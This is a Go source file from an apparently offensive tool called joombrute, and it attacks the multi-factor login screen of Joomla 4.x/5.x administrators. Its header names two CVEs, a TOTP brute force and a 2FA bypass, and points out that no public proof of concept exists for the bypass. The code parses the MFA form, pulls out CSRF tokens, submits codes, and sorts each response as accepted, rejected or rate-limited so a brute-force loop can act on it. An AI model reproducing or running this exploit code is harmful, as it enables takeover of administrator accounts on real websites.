// Package mfa implements attacks against the Joomla 4.x/5.x captive MFA
// screen - the second step that gates an admin login once a password is
// validated but MFA is enforced.
//
// Two CVE-grade primitives live here:
//
// - CVE-2023-23755 (Joomla 4.2.0 - 4.3.1): the captive screen had no rate
//     limiting on TOTP submission, so the 6-digit code space (1e6) is
//     exhaustible. Fixed in 4.3.2.
//
// - CVE-2025-25227 (Joomla 4.0.0 - 4.4.12 and 5.0.0 - 5.2.5): an insufficient
//     state check on the captive view allows bypassing the 2FA challenge
//     entirely. Fixed in 4.4.13 / 5.2.6 (April 2025). No public PoC in MSF
//     or Nuclei at time of writing; this is the differentiator.
package mfa

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"

	"github.com/PuerkitoBio/goquery"
	"github.com/rvzsec/joombrute/internal/httpx"
)

// submitDebug, when true, prints every captive POST body and response
// metadata to stderr. Set JOOMBRUTE_DEBUG_SUBMIT=1 to enable. Kept off
// the standard --debug flag because it leaks code attempts to stderr;
// only useful when reverse-engineering an unfamiliar Joomla template.
var submitDebug = os.Getenv("JOOMBRUTE_DEBUG_SUBMIT") == "1"

// CaptiveForm holds the parsed state of the MFA captive screen needed to
// submit a code (or a bypass probe). The same 32-hex CSRF token pattern as
// the login form applies here, but the form action and method vary by
// Joomla version.
type CaptiveForm struct {
	// URL of the captive page itself (used as the GET target).
	PageURL string
	// Action is the absolute POST target (com_users captive controller).
	Action string
	// TokenName is the 32-hex CSRF token field name (value="1").
	TokenName string
	// MethodID is the selected MFA method (e.g. "totp", "yubikey", "email").
	// Joomla submits this in a hidden field so the controller knows which
	// validator to dispatch to.
	MethodID string
	// RecordID is the MFA record ID (per-method, per-user).
	RecordID string
}

// reCaptiveTokenName matches the captive screen CSRF token. Same pattern as
// the login form (32-hex name + value="1") but we keep a separate regex so
// future divergence is cheap.
var reCaptiveTokenName = regexp.MustCompile(`<input[^>]+type=["']hidden["'][^>]+name=["']([a-f0-9]{32})["'][^>]+value=["']1["']`)

// FetchCaptiveForm GETs the captive screen URL (the one the operator landed
// on after a successful password) and extracts what we need to submit a code.
//
// The supplied client MUST already hold the post-login session cookie and
// MUST be configured with FollowRedirects=false so any further redirects
// (e.g. session expired -> login) are visible to the caller.
func FetchCaptiveForm(ctx context.Context, client *http.Client, captiveURL string) (*CaptiveForm, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, captiveURL, nil)
	if err != nil {
		return nil, err
	}
	httpx.SetUA(req, "")
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("GET captive: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("captive returned %d (session expired?)", resp.StatusCode)
	}

	doc, err := goquery.NewDocumentFromReader(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("parse captive html: %w", err)
	}

	f := &CaptiveForm{PageURL: captiveURL, Action: captiveURL}

	// The Joomla 4/5 captive form has no stable id - only its action URL
	// signature (task=captive.validate). We locate it by scanning every
	// form on the page for that signature, then fall back to "form contains
	// an input named code" which is the captive UX in J4/J5.
	var formSel *goquery.Selection
	doc.Find("form").EachWithBreak(func(_ int, s *goquery.Selection) bool {
		action, _ := s.Attr("action")
		if strings.Contains(action, "captive.validate") {
			formSel = s
			return false
		}
		return true
	})
	if formSel == nil {
		// Fallback: any form that contains an input[name="code"].
		doc.Find("form").EachWithBreak(func(_ int, s *goquery.Selection) bool {
			if s.Find(`input[name="code"]`).Length() > 0 {
				formSel = s
				return false
			}
			return true
		})
	}
	if formSel == nil || formSel.Length() == 0 {
		return nil, fmt.Errorf("captive form not found")
	}
	if action, ok := formSel.Attr("action"); ok && action != "" {
		// Joomla emits HTML-encoded ampersands in form actions: &amp; ->
		// we need raw & for the POST URL.
		action = strings.ReplaceAll(action, "&amp;", "&")
		f.Action = resolveCaptiveAction(captiveURL, action)
	}

	// Extract CSRF token + method/record IDs.
	formSel.Find(`input[type="hidden"]`).Each(func(_ int, s *goquery.Selection) {
		name, _ := s.Attr("name")
		val, _ := s.Attr("value")
		switch {
		case val == "1" && isHex32(name):
			f.TokenName = name
		case name == "record_id":
			f.RecordID = val
		case name == "method":
			f.MethodID = val
		}
	})

	if f.TokenName == "" {
		// Body re-read via regex fallback. We need to re-fetch since the
		// reader is consumed. Cheap and rare.
		if name, err := captiveTokenFallback(ctx, client, captiveURL); err == nil {
			f.TokenName = name
		}
	}
	if f.TokenName == "" {
		return nil, fmt.Errorf("could not locate CSRF token on captive screen")
	}

	return f, nil
}

func captiveTokenFallback(ctx context.Context, client *http.Client, u string) (string, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return "", err
	}
	httpx.SetUA(req, "")
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
	if err != nil {
		return "", err
	}
	m := reCaptiveTokenName.FindSubmatch(body)
	if len(m) < 2 {
		return "", fmt.Errorf("captive token regex miss")
	}
	return string(m[1]), nil
}

// SubmitCode POSTs a TOTP/email/backup code to the captive endpoint and
// classifies the outcome. Used by the CVE-2023-23755 brute loop and by
// targeted "I have one code, try it" runs.
//
// Outcomes:
// - accepted: 3xx redirect to /administrator/index.php (com_cpanel)
// - rejected: 200 OK or redirect back to captive
// - blocked:  4xx/5xx (rate limit, after the 4.3.2 fix)
func SubmitCode(ctx context.Context, client *http.Client, f *CaptiveForm, code string) (CodeOutcome, error) {
	if f == nil || f.TokenName == "" {
		return CodeOutcomeUnknown, fmt.Errorf("captive form not prepared")
	}

	// Build POST body. We send ONLY the fields the J4/J5 captive form
	// emits - extra fields like record_id collide with the query string
	// the form action already carries (?record_id=N).
	body := url.Values{}
	body.Set("code", code)
	body.Set(f.TokenName, "1")
	if f.MethodID != "" {
		body.Set("method", f.MethodID)
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, f.Action, strings.NewReader(body.Encode()))
	if err != nil {
		return CodeOutcomeUnknown, err
	}
	httpx.SetUA(req, "")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Referer", f.PageURL)

	if submitDebug {
		fmt.Fprintf(os.Stderr, "[submit] POST %s\n  body: %s\n", f.Action, body.Encode())
	}

	resp, err := client.Do(req)
	if err != nil {
		return CodeOutcomeUnknown, fmt.Errorf("POST captive: %w", err)
	}
	defer resp.Body.Close()

	if submitDebug {
		fmt.Fprintf(os.Stderr, "[submit] resp: HTTP %d  Location=%q  Set-Cookie=%q\n",
			resp.StatusCode, resp.Header.Get("Location"), resp.Header.Get("Set-Cookie"))
	}

	switch {
	case resp.StatusCode == http.StatusForbidden,
		resp.StatusCode == http.StatusTooManyRequests,
		resp.StatusCode == http.StatusServiceUnavailable:
		return CodeOutcomeBlocked, nil
	case resp.StatusCode >= 300 && resp.StatusCode < 400:
		loc := resp.Header.Get("Location")
		low := strings.ToLower(loc)
		switch {
		// Captive re-render = code was rejected. Joomla 4/5 sometimes
		// appends &record_id=N when re-rendering, sometimes not.
		case strings.Contains(low, "view=captive"),
			strings.Contains(low, "view=methods"),
			strings.Contains(low, "com_users") && strings.Contains(low, "captive"):
			return CodeOutcomeRejected, nil
		// Direct cpanel landing = code accepted.
		case strings.Contains(low, "option=com_cpanel"),
			strings.Contains(low, "view=cpanel"):
			return CodeOutcomeAccepted, nil
		// Bare /administrator/index.php - could be either. J4 emits this
		// for BOTH the valid-TOTP success path (will redirect onward to
		// cpanel) and some failure modes. Follow it and content-classify.
		case strings.Contains(low, "/administrator/"):
			return followCaptiveLocation(ctx, client, loc), nil
		}
		return CodeOutcomeUnknown, nil
	}

	// 200 OK - failure re-render, success inline-render, or session death.
	buf, _ := io.ReadAll(io.LimitReader(resp.Body, 32*1024))
	low := strings.ToLower(string(buf))
	switch {
	case strings.Contains(low, "captive") && (strings.Contains(low, "invalid") || strings.Contains(low, "code is incorrect")):
		return CodeOutcomeRejected, nil
	case strings.Contains(low, "com_cpanel"), strings.Contains(low, `id="cpanel"`):
		return CodeOutcomeAccepted, nil
	}
	return CodeOutcomeUnknown, nil
}

// CodeOutcome classifies a single MFA code submission.
type CodeOutcome int

const (
	CodeOutcomeUnknown CodeOutcome = iota
	CodeOutcomeRejected
	CodeOutcomeAccepted
	CodeOutcomeBlocked
)

func (o CodeOutcome) String() string {
	switch o {
	case CodeOutcomeRejected:
		return "rejected"
	case CodeOutcomeAccepted:
		return "accepted"
	case CodeOutcomeBlocked:
		return "blocked"
	default:
		return "unknown"
	}
}

// followCaptiveLocation chases the bare /administrator/index.php redirect
// the captive endpoint emits on a SUCCESSFUL code submission. J4/J5
// re-checks the session state on the next GET; if MFA was just satisfied
// the response 307s onward to com_cpanel; if MFA still needs to be
// solved it 307s back to view=captive.
//
// Up to maxHops to absorb the J4 two-hop bounce.
func followCaptiveLocation(ctx context.Context, client *http.Client, loc string) CodeOutcome {
	const maxHops = 4
	currentURL := loc
	for hop := 0; hop < maxHops; hop++ {
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, currentURL, nil)
		if err != nil {
			return CodeOutcomeUnknown
		}
		httpx.SetUA(req, "")
		resp, err := client.Do(req)
		if err != nil {
			return CodeOutcomeUnknown
		}
		if resp.StatusCode >= 300 && resp.StatusCode < 400 {
			next := resp.Header.Get("Location")
			resp.Body.Close()
			if next == "" {
				return CodeOutcomeUnknown
			}
			low := strings.ToLower(next)
			switch {
			case strings.Contains(low, "view=captive"),
				strings.Contains(low, "view=methods"):
				return CodeOutcomeRejected
			case strings.Contains(low, "option=com_cpanel"),
				strings.Contains(low, "view=cpanel"):
				return CodeOutcomeAccepted
			}
			currentURL = next
			continue
		}
		// Terminal 2xx - content-classify.
		buf, _ := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
		resp.Body.Close()
		low := strings.ToLower(string(buf))
		switch {
		case strings.Contains(low, "captive-form"),
			strings.Contains(low, "task=captive.validate"),
			strings.Contains(low, "view=captive"):
			return CodeOutcomeRejected
		case strings.Contains(low, `id="cpanel"`),
			strings.Contains(low, "option=com_cpanel"),
			strings.Contains(low, "control panel"):
			return CodeOutcomeAccepted
		}
		return CodeOutcomeUnknown
	}
	return CodeOutcomeUnknown
}

// isHex32 mirrors joomla.isHex32 - duplicated to avoid an import cycle.
func isHex32(s string) bool {
	if len(s) != 32 {
		return false
	}
	for _, c := range s {
		switch {
		case c >= '0' && c <= '9':
		case c >= 'a' && c <= 'f':
		default:
			return false
		}
	}
	return true
}

// resolveCaptiveAction turns the form's action attribute into an
// absolute URL. The Joomla captive form action is a path+query like
// "/administrator/index.php?option=com_users&task=captive.validate&record_id=1"
// - we MUST split the path and query and assign them separately so
// url.URL.String() doesn't percent-encode the literal "?".
func resolveCaptiveAction(pageURL, action string) string {
	action = strings.TrimSpace(action)
	switch {
	case action == "":
		return pageURL
	case strings.HasPrefix(action, "http://") || strings.HasPrefix(action, "https://"):
		return action
	case strings.HasPrefix(action, "/"):
		base, err := url.Parse(pageURL)
		if err != nil {
			return pageURL
		}
		// url.Parse on a path+query string handles the split correctly.
		parsed, err := url.Parse(action)
		if err != nil {
			return pageURL
		}
		base.Path = parsed.Path
		base.RawQuery = parsed.RawQuery
		base.Fragment = ""
		return base.String()
	default:
		base, err := url.Parse(pageURL)
		if err != nil {
			return pageURL
		}
		ref, err := url.Parse(action)
		if err != nil {
			return pageURL
		}
		return base.ResolveReference(ref).String()
	}
}
